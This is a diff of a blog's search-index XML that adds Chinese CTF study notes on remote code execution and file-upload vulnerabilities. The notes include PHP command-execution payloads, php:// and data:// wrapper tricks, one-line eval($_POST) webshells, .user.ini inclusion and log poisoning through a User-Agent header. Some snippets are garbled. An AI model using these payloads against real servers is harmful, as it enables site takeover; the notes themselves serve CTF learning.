@@ -4,7 +4,7 @@
   
     
     <entry>
-      <title>XML &amp; XXE &amp; 无回显</title>
+      <title>XML&amp;XXE&amp;无回显</title>
       <link href="/2023/05/08/XML%20&amp;%20XXE%20&amp;%20%E6%97%A0%E5%9B%9E%E6%98%BE/"/>
       <url>/2023/05/08/XML%20&amp;%20XXE%20&amp;%20%E6%97%A0%E5%9B%9E%E6%98%BE/</url>
       
@@ -23,7 +23,7 @@
     
     
     <entry>
-      <title></title>
+      <title>SSRF服务器端请求伪造</title>
       <link href="/2023/05/08/SSRF/"/>
       <url>/2023/05/08/SSRF/</url>
       
@@ -31,18 +31,30 @@
       
       
       
+        <tags>
+            
+            <tag> SSRF </tag>
+            
+        </tags>
+      
     </entry>
     
     
     
     <entry>
-      <title></title>
+      <title>RCE漏洞</title>
       <link href="/2023/05/08/RCE%E6%BC%8F%E6%B4%9E/"/>
       <url>/2023/05/08/RCE%E6%BC%8F%E6%B4%9E/</url>
       
         <content type="html"><![CDATA[<h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><h2 id="RCE代码执行-x2F-x2F-eval-‘phpinfo-’-解析代码"><a href="#RCE代码执行-x2F-x2F-eval-‘phpinfo-’-解析代码" class="headerlink" title="RCE代码执行 &#x2F;&#x2F;eval(‘phpinfo()’) 解析代码"></a>RCE代码执行 &#x2F;&#x2F;eval(‘phpinfo()’) 解析代码</h2><h2 id="命令执行-x2F-x2F-system-‘ver’-调用系统命令"><a href="#命令执行-x2F-x2F-system-‘ver’-调用系统命令" class="headerlink" title="命令执行 &#x2F;&#x2F; system(‘ver’)  调用系统命令"></a>命令执行 &#x2F;&#x2F; system(‘ver’)  调用系统命令</h2><p> eval是Python的一个内置函数，功能十分强大，这个函数的作用是，返回传入字符串的表达式的结果。就是说：将字符串当成有效的表达式 来求值 并 返回计算结果。</p><blockquote><p>eval(expression[, globals[, locals]])<br>expression ： 表达式。<br>globals ： （可选参数)变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。<br>locals ： (可选参数)变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p></blockquote><p>存在场景</p><blockquote><p>存在一些功能，在应用功能中<br>需要调用脚本代码或者系统命令执行</p></blockquote><p>web，中间件，操作系统，框架都存在</p><h2 id="危害，直接执行命令或代码"><a href="#危害，直接执行命令或代码" class="headerlink" title="危害，直接执行命令或代码"></a>危害，直接执行命令或代码</h2><p>可以写入后门…</p><blockquote><p>黑盒漏洞难以发现</p></blockquote><h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><h4 id="1-PHP："><a href="#1-PHP：" class="headerlink" title="1.PHP："></a>1.PHP：</h4><p>eval()、assert()、preg_replace()、call_user_func()、<br>call_user_func_array()以及 array_map()等</p><blockquote><p>system、shell_exec、popen、passthru、proc_open 等</p></blockquote><p><code>?a =echo shell_exec(&#39;ls&#39;)</code><br><code>?a=echo shell_exec(&#39;tac fla*&#39;)</code></p><h4 id="2-Python："><a href="#2-Python：" class="headerlink" title="2.Python："></a>2.Python：</h4><p>eval exec subprocess os.system commands </p><h4 id="3-Java："><a href="#3-Java：" class="headerlink" title="3.Java："></a>3.Java：</h4><p>Java 中没有类似 php 中 eval 函数这种直接可以将字符串转化为代码执行的函数，<br>但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL<br>等.</p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>源码中存在<code>eval（$a）</code></p><p>system(‘ls’)<br>命令执行：</p><blockquote><p>? a &#x3D;  system(‘tac fla*.php’)</p></blockquote><p>代码执行</p><blockquote><p>? a &#x3D; phpinfo()</p></blockquote><h4 id="有过滤："><a href="#有过滤：" class="headerlink" title="有过滤："></a>有过滤：</h4><p>参数逃逸： 绕过过滤参数<br><code>eval($_GET[1]);&amp;1=system(&#39;tac flag.php&#39;);</code></p><p>32~36-配合包含&amp;伪协议</p><p><code>include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(&#39;tac  flag.php&#39;);?&gt;</code></p><p><code>include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64- encode/resource=flag.php</code></p><p>37~39-包含&amp;伪协议&amp;通配符</p><p><code>data://text/plain,&lt;?=system(&#39;tac fla*&#39;);?&gt;</code></p><p><code>php://input post:&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> RCE </tag>
+            
+        </tags>
       
     </entry>
     
@@ -250,7 +262,7 @@
       <link href="/2023/05/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1/"/>
       <url>/2023/05/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1/</url>
       
-        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>上传文件时，Web应用程序没有对上传文件的格式进行严格过滤 , 就容易造成可以上传任意文件的情况。还有一部分是攻击者通过 Web服务器的解析漏洞来突破Web应用程序的防护。<br>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞，攻击者可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器，这个恶意脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门。WebShell具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="1、常规类"><a href="#1、常规类" class="headerlink" title="1、常规类"></a>1、常规类</h3><ul><li>扫描获取上传</li><li>会员中心上传</li><li>后台系统上传</li><li>各种途径上传</li></ul><h3 id="2、CMS类"><a href="#2、CMS类" class="headerlink" title="2、CMS类"></a>2、CMS类</h3><ul><li>利用CMS源码</li></ul><h3 id="3、编辑器类-编辑器组件漏洞"><a href="#3、编辑器类-编辑器组件漏洞" class="headerlink" title="3、编辑器类(编辑器组件漏洞)"></a>3、编辑器类(编辑器组件漏洞)</h3><ul><li>cheditor</li><li>fckeditor</li><li>kindeditor</li><li>xxxeditor</li></ul><h3 id="4、其他类-x2F-cve"><a href="#4、其他类-x2F-cve" class="headerlink" title="4、其他类&#x2F;cve"></a>4、其他类&#x2F;cve</h3><ul><li>代码审计</li><li>平台&#x2F;三方应用</li></ul><h2 id="文件上传黑-x2F-白名单绕过"><a href="#文件上传黑-x2F-白名单绕过" class="headerlink" title="文件上传黑&#x2F;白名单绕过"></a>文件上传黑&#x2F;白名单绕过</h2><h3 id="1、验证-x2F-绕过"><a href="#1、验证-x2F-绕过" class="headerlink" title="1、验证&#x2F;绕过"></a>1、验证&#x2F;绕过</h3><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><h5 id="1-js"><a href="#1-js" class="headerlink" title="1. js"></a>1. js</h5><h4 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h4><h5 id="1-黑名单"><a href="#1-黑名单" class="headerlink" title="1. 黑名单"></a>1. 黑名单</h5><pre><code>- 特殊解析后缀- .htaccess解析- 大小写绕过- 点绕过- 空格绕过- ::$DATA绕过- 配合解析漏洞- 双后缀名绕过</code></pre><h5 id="2-白名单"><a href="#2-白名单" class="headerlink" title="2. 白名单"></a>2. 白名单</h5><pre><code>- MIME类型- %00截断- 0x00截断- 0x0a截断</code></pre><h5 id="3-内容以及其他"><a href="#3-内容以及其他" class="headerlink" title="3. 内容以及其他"></a>3. 内容以及其他</h5><pre><code>- 文件头检测- 二次渲染- 条件竞争- 突破getmagesize- 突破exif_imagetype</code></pre><h3 id="2、漏洞修复"><a href="#2、漏洞修复" class="headerlink" title="2、漏洞修复"></a>2、漏洞修复</h3><h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><ul><li>IIS</li><li>Apache</li><li>Nginx</li></ul><h4 id="cms漏洞"><a href="#cms漏洞" class="headerlink" title="cms漏洞"></a>cms漏洞</h4><ul><li>某CMS上传漏洞未修复</li></ul><h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><ul><li><p>编辑器漏洞</p><ul><li>cheditor</li><li>fckeditor</li><li>kindeditor</li><li>xxxeditor</li></ul></li><li><p>CVE漏洞</p><ul><li>CVE-2015</li><li>CVE-2016</li><li>CVE-2017</li></ul></li><li><p>安全修复</p></li></ul><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3>]]></content>
+        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>上传文件时，Web应用程序没有对上传文件的格式进行严格过滤 , 就容易造成可以上传任意文件的情况。还有一部分是攻击者通过 Web服务器的解析漏洞来突破Web应用程序的防护。<br>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞，攻击者可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器，这个恶意脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门。WebShell具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="1、常规类"><a href="#1、常规类" class="headerlink" title="1、常规类"></a>1、常规类</h3><ul><li>扫描获取上传</li><li>会员中心上传</li><li>后台系统上传</li><li>各种途径上传</li></ul><h3 id="2、CMS类"><a href="#2、CMS类" class="headerlink" title="2、CMS类"></a>2、CMS类</h3><ul><li>利用CMS源码</li></ul><h3 id="3、编辑器类-编辑器组件漏洞"><a href="#3、编辑器类-编辑器组件漏洞" class="headerlink" title="3、编辑器类(编辑器组件漏洞)"></a>3、编辑器类(编辑器组件漏洞)</h3><ul><li>cheditor</li><li>fckeditor</li><li>kindeditor</li><li>xxxeditor</li></ul><h3 id="4、其他类-x2F-cve"><a href="#4、其他类-x2F-cve" class="headerlink" title="4、其他类&#x2F;cve"></a>4、其他类&#x2F;cve</h3><ul><li>代码审计</li><li>平台&#x2F;三方应用</li></ul><h2 id="文件上传黑-x2F-白名单绕过"><a href="#文件上传黑-x2F-白名单绕过" class="headerlink" title="文件上传黑&#x2F;白名单绕过"></a>文件上传黑&#x2F;白名单绕过</h2><h3 id="1、验证-x2F-绕过"><a href="#1、验证-x2F-绕过" class="headerlink" title="1、验证&#x2F;绕过"></a>1、验证&#x2F;绕过</h3><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><h5 id="1-js"><a href="#1-js" class="headerlink" title="1. js"></a>1. js</h5><h4 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h4><h5 id="1-黑名单"><a href="#1-黑名单" class="headerlink" title="1. 黑名单"></a>1. 黑名单</h5><pre><code>- 特殊解析后缀- .htaccess解析- 大小写绕过- 点绕过- 空格绕过- ::$DATA绕过- 配合解析漏洞- 双后缀名绕过</code></pre><h5 id="2-白名单"><a href="#2-白名单" class="headerlink" title="2. 白名单"></a>2. 白名单</h5><pre><code>- MIME类型- %00截断- 0x00截断- 0x0a截断</code></pre><h5 id="3-内容以及其他"><a href="#3-内容以及其他" class="headerlink" title="3. 内容以及其他"></a>3. 内容以及其他</h5><pre><code>- 文件头检测- 二次渲染- 条件竞争- 突破getmagesize- 突破exif_imagetype</code></pre><h3 id="2、漏洞修复"><a href="#2、漏洞修复" class="headerlink" title="2、漏洞修复"></a>2、漏洞修复</h3><h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><ul><li>IIS</li><li>Apache</li><li>Nginx</li></ul><h4 id="cms漏洞"><a href="#cms漏洞" class="headerlink" title="cms漏洞"></a>cms漏洞</h4><ul><li>某CMS上传漏洞未修复</li></ul><h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><ul><li><p>编辑器漏洞</p><ul><li>cheditor</li><li>fckeditor</li><li>kindeditor</li><li>xxxeditor</li></ul></li><li><p>CVE漏洞</p><ul><li>CVE-2015</li><li>CVE-2016</li><li>CVE-2017</li></ul></li><li><p>安全修复</p></li></ul><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><hr><h4 id="笔记-1"><a href="#笔记-1" class="headerlink" title="笔记-1"></a>笔记-1</h4><p>文件上传 -CTF 151~161</p><p>1、前端验证<br>2、黑白名单<br>3、user.ini妙用<br>4、PHP语言特性</p><p>目标：通过文件上传漏洞上传后门文件</p><p>菜刀冰倔等。。。。</p><p>后门代码需要用特定的的后缀解析，不能以图片后缀解析脚本后门代码（解析漏洞除外）<br>jpg图片，里面有后门代码</p><?php eval " $POSt[x]" ?><p>x&#x3D;system(‘tac ..&#x2F;flag.php’)</p><p>1、前端验证，修改前端js代码，png类型修改为后门文件类型 eg: xxx.php<br>上传成功–》  URL直接获取数据</p><p>2、mim1前后端验证，修改前js 代码，抓包修改传入后端的文件类型为支持的类型，后端验证成功。</p><p>3、.user.ini  php 全局配置文件：<br>auto_prepend_file &#x3D; <filename> &#x2F;&#x2F;包含在文件头<br>auto_append_file&#x3D;<filename> &#x2F;&#x2F;包含在文件尾</p><ul><li>上传一个.user.ini 包含需要上传的后门文件-？–》上传后门文件直接访问</li></ul><p>有过滤：<br>使用其他格式：可以百度有好几种方式<br><? = eval ( $_post [ x ] ) ?></p><ul><li><p>上传 test.png 包含恶意代码</p><?=include "/var/lo"."g /nginx/access.lo"," g " ?><p>再上传<br>.user.ini<br>auto_prepend_ifle &#x3D;&lt;&gt;<br>访问路径：<br>打印日志信息<br>在抓包修改<br>User-Agent : <?php eval($_POST[x]);?><br>直接post请求访问<br>x&#x3D;system(‘tac..&#x2F;flag.php’)</p></li><li><p>文件上传，验证上传文件的文件头</p></li></ul>]]></content>
       
       
       
